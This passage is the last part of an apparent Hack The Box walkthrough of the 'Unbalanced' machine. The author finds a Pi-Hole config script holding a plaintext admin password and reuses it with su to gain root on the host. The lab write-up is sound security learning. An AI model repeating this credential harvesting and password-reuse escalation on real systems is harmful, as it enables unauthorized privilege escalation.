<img src="/assets/img/ChallengeVMs/Unbalanced/img12.png"  style="width: 70%" />
</p>

### Gaining Root access to the host

Now this doesn't mean that we are root on the box, we are just root on the Pi-Hole. Navigating to `/root`, we can see two files, 
* ph_install.sh
* pihole_config.sh

Opening `pihole_config.sh`, we can see that we have plaintext credentials for the admin interface.

<details>

```conf
cat pihole_config.sh
#!/bin/bash

# Add domains to whitelist
/usr/local/bin/pihole -w unbalanced.htb
/usr/local/bin/pihole -w rebalanced.htb

# Set temperature unit to Celsius
/usr/local/bin/pihole -a -c

# Add local host record
/usr/local/bin/pihole -a hostrecord pihole.unbalanced.htb 127.0.0.1

# Set privacy level
/usr/local/bin/pihole -a -l 4

# Set web admin interface password
/usr/local/bin/pihole -a -p 'bUbBl3gUm$43v3Ry0n3!'

# Set admin email
/usr/local/bin/pihole -a email admin@unbalanced.htb
```
</details>

As a final step, I needed to return to the initial SSH session with the Bryan user and I was able to elevate my privileges to the root user using the `su` command:

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Unbalanced/img13.png"  style="width: 70%" />
</p>

That's the box! I hope that the walkthrough helped someone. If you found it interesting at all or if you think it was missing some crucial information, please reach out to me so that I can continue improving as I create more posts.